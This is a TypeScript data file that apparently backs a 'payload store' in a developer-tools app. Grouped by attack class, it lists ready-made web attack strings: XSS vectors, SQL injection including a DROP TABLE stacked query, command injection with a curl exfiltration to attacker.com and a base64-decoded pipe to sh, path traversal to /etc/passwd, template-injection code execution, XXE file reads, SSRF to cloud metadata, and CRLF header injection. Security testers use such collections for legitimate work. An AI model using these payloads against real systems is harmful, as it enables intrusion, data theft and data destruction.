/** Payload 分组数据 */
export interface PayloadItem {
  labelKey: string;
  value: string;
}

export interface PayloadGroup {
  key: string;
  titleKey: string;
  items: PayloadItem[];
}

export const PAYLOAD_GROUPS: PayloadGroup[] = [
  {
    key: 'xss',
    titleKey: 'devtools.payloadStore.groups.xss.title',
    items: [
      { labelKey: 'devtools.payloadStore.groups.xss.items.basicAlert', value: '<script>alert(1)</script>' },
      { labelKey: 'devtools.payloadStore.groups.xss.items.imgOnerror', value: '<img src=x onerror=alert(1)>' },
      { labelKey: 'devtools.payloadStore.groups.xss.items.svgOnload', value: '<svg onload=alert(1)>' },
      { labelKey: 'devtools.payloadStore.groups.xss.items.eventHandler', value: '" onfocus="alert(1)" autofocus="' },
      { labelKey: 'devtools.payloadStore.groups.xss.items.bodyOnload', value: '<body onload=alert(1)>' },
      { labelKey: 'devtools.payloadStore.groups.xss.items.inputOnfocus', value: '<input onfocus=alert(1) autofocus>' },
      { labelKey: 'devtools.payloadStore.groups.xss.items.iframeSrcdoc', value: '<iframe srcdoc="<script>alert(1)</script>">' },
      { labelKey: 'devtools.payloadStore.groups.xss.items.detailsOpen', value: '<details open ontoggle=alert(1)>' },
      { labelKey: 'devtools.payloadStore.groups.xss.items.bypassFilter', value: '<scr<script>ipt>alert(1)</scr</script>ipt>' },
      { labelKey: 'devtools.payloadStore.groups.xss.items.unicodeBypass', value: '<script>alert\u0060XSS\u0060</script>' },
    ],
  },
  {
    key: 'sqli',
    titleKey: 'devtools.payloadStore.groups.sqli.title',
    items: [
      { labelKey: 'devtools.payloadStore.groups.sqli.items.authBypass', value: "' OR '1'='1' --" },
      { labelKey: 'devtools.payloadStore.groups.sqli.items.unionSelect', value: "' UNION SELECT 1,2,3 --" },
      { labelKey: 'devtools.payloadStore.groups.sqli.items.errorBased', value: "' AND 1=CONVERT(int,(SELECT @@version)) --" },
      { labelKey: 'devtools.payloadStore.groups.sqli.items.timeBased', value: "' AND SLEEP(5) --" },
      { labelKey: 'devtools.payloadStore.groups.sqli.items.booleanBlind', value: "' AND 1=1 --" },
      { labelKey: 'devtools.payloadStore.groups.sqli.items.mysqlVersion', value: "' UNION SELECT @@version --" },
      { labelKey: 'devtools.payloadStore.groups.sqli.items.stackedQuery', value: "'; DROP TABLE users; --" },
      { labelKey: 'devtools.payloadStore.groups.sqli.items.orderByProbe', value: "' ORDER BY 10 --" },
      { labelKey: 'devtools.payloadStore.groups.sqli.items.extractvalue', value: "' AND extractvalue(1,concat(0x7e,(SELECT user()))) --" },
      { labelKey: 'devtools.payloadStore.groups.sqli.items.updatexml', value: "' AND updatexml(1,concat(0x7e,(SELECT database())),1) --" },
    ],
  },
  {
    key: 'cmd-injection',
    titleKey: 'devtools.payloadStore.groups.cmdInjection.title',
    items: [
      { labelKey: 'devtools.payloadStore.groups.cmdInjection.items.pipe', value: '| whoami' },
      { labelKey: 'devtools.payloadStore.groups.cmdInjection.items.semicolon', value: '; whoami' },
      { labelKey: 'devtools.payloadStore.groups.cmdInjection.items.andOperator', value: '&& whoami' },
      { labelKey: 'devtools.payloadStore.groups.cmdInjection.items.backticks', value: '`whoami`' },
      { labelKey: 'devtools.payloadStore.groups.cmdInjection.items.subshell', value: '$(whoami)' },
      { labelKey: 'devtools.payloadStore.groups.cmdInjection.items.pingProbe', value: '| ping -c 3 127.0.0.1' },
      { labelKey: 'devtools.payloadStore.groups.cmdInjection.items.curlExfil', value: '| curl http://attacker.com/$(whoami)' },
      { labelKey: 'devtools.payloadStore.groups.cmdInjection.items.base64Bypass', value: '| echo d2hvYW1p | base64 -d | sh' },
    ],
  },
  {
    key: 'path-traversal',
    titleKey: 'devtools.payloadStore.groups.pathTraversal.title',
    items: [
      { labelKey: 'devtools.payloadStore.groups.pathTraversal.items.basic', value: '../../../../etc/passwd' },
      { labelKey: 'devtools.payloadStore.groups.pathTraversal.items.windows', value: '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts' },
      { labelKey: 'devtools.payloadStore.groups.pathTraversal.items.urlEncoded', value: '..%2f..%2f..%2fetc%2fpasswd' },
      { labelKey: 'devtools.payloadStore.groups.pathTraversal.items.doubleEncoded', value: '..%252f..%252f..%252fetc%252fpasswd' },
      { labelKey: 'devtools.payloadStore.groups.pathTraversal.items.nullByte', value: '../../../../etc/passwd%00.jpg' },
      { labelKey: 'devtools.payloadStore.groups.pathTraversal.items.utf8Encoded', value: '..%c0%af..%c0%afetc/passwd' },
    ],
  },
  {
    key: 'ssti',
    titleKey: 'devtools.payloadStore.groups.ssti.title',
    items: [
      { labelKey: 'devtools.payloadStore.groups.ssti.items.jinja2Probe', value: '{{7*7}}' },
      { labelKey: 'devtools.payloadStore.groups.ssti.items.twigProbe', value: '{{7*\'7\'}}' },
      { labelKey: 'devtools.payloadStore.groups.ssti.items.freemarker', value: '${7*7}' },
      { labelKey: 'devtools.payloadStore.groups.ssti.items.jinja2Rce', value: "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}" },
      { labelKey: 'devtools.payloadStore.groups.ssti.items.mako', value: '${__import__("os").popen("whoami").read()}' },
      { labelKey: 'devtools.payloadStore.groups.ssti.items.smarty', value: '{system("whoami")}' },
    ],
  },
  {
    key: 'xxe',
    titleKey: 'devtools.payloadStore.groups.xxe.title',
    items: [
      { labelKey: 'devtools.payloadStore.groups.xxe.items.fileRead', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' },
      { labelKey: 'devtools.payloadStore.groups.xxe.items.ssrfProbe', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80">]><foo>&xxe;</foo>' },
      { labelKey: 'devtools.payloadStore.groups.xxe.items.parameterEntity', value: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>' },
    ],
  },
  {
    key: 'ssrf',
    titleKey: 'devtools.payloadStore.groups.ssrf.title',
    items: [
      { labelKey: 'devtools.payloadStore.groups.ssrf.items.localhost', value: 'http://127.0.0.1' },
      { labelKey: 'devtools.payloadStore.groups.ssrf.items.zeroAddress', value: 'http://0.0.0.0' },
      { labelKey: 'devtools.payloadStore.groups.ssrf.items.ipv6Localhost', value: 'http://[::1]' },
      { labelKey: 'devtools.payloadStore.groups.ssrf.items.decimalIp', value: 'http://2130706433' },
      { labelKey: 'devtools.payloadStore.groups.ssrf.items.octalIp', value: 'http://0177.0.0.1' },
      { labelKey: 'devtools.payloadStore.groups.ssrf.items.awsMetadata', value: 'http://169.254.169.254/latest/meta-data/' },
      { labelKey: 'devtools.payloadStore.groups.ssrf.items.fileScheme', value: 'file:///etc/passwd' },
      { labelKey: 'devtools.payloadStore.groups.ssrf.items.dictScheme', value: 'dict://127.0.0.1:6379/info' },
      { labelKey: 'devtools.payloadStore.groups.ssrf.items.gopherScheme', value: 'gopher://127.0.0.1:6379/_INFO' },
    ],
  },
  {
    key: 'header-injection',
    titleKey: 'devtools.payloadStore.groups.headerInjection.title',
    items: [
      { labelKey: 'devtools.payloadStore.groups.headerInjection.items.crlf', value: '%0d%0aSet-Cookie:hacked=true' },
      { labelKey: 'devtools.payloadStore.groups.headerInjection.items.hostHeader', value: 'evil.com' },
      { labelKey: 'devtools.payloadStore.groups.headerInjection.items.xForwardedFor', value: '127.0.0.1' },
      { labelKey: 'devtools.payloadStore.groups.headerInjection.items.refererSpoof', value: 'https://trusted-site.com' },
    ],
  },
];

